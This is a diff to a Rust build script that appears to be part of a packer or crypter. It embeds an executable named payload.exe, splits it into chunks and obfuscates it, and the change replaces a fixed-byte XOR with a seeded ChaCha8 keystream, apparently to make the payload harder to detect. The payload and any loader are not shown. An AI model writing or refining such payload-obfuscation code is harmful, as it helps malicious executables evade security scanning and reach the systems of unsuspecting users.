@@ -1,8 +1,8 @@
 use std::fs::{self, File};
 use std::io::Write;
 use std::path::Path;
-// use rand::{Rng, SeedableRng}; // Unused
-// use rand_chacha::ChaCha8Rng; // Unused
+use rand::{Rng, SeedableRng};
+use rand_chacha::ChaCha8Rng;
 
 fn main() {
     println!("cargo:rerun-if-changed=payload.exe");
@@ -54,7 +54,7 @@ fn generate_random_seed() -> u64 {
 fn generate_chunks(payload: &[u8]) {
     const CHUNK_SIZE: usize = 4096;
     let seed = generate_random_seed();
-    // let mut rng = ChaCha8Rng::seed_from_u64(seed); // Unused
+    let mut rng = ChaCha8Rng::seed_from_u64(seed);
     
     let mut obfuscated_pool = Vec::new();
     let mut cursor = 0;
@@ -63,9 +63,10 @@ fn generate_chunks(payload: &[u8]) {
         let chunk_end = (cursor + CHUNK_SIZE).min(payload.len());
         let chunk = &payload[cursor..chunk_end];
         
-        // XOR obfuscation
+        // XOR obfuscation with RNG stream
         for &byte in chunk {
-            obfuscated_pool.push(byte ^ 0x55);
+            let key_byte: u8 = rng.gen();
+            obfuscated_pool.push(byte ^ key_byte);
         }
         
         cursor = chunk_end;
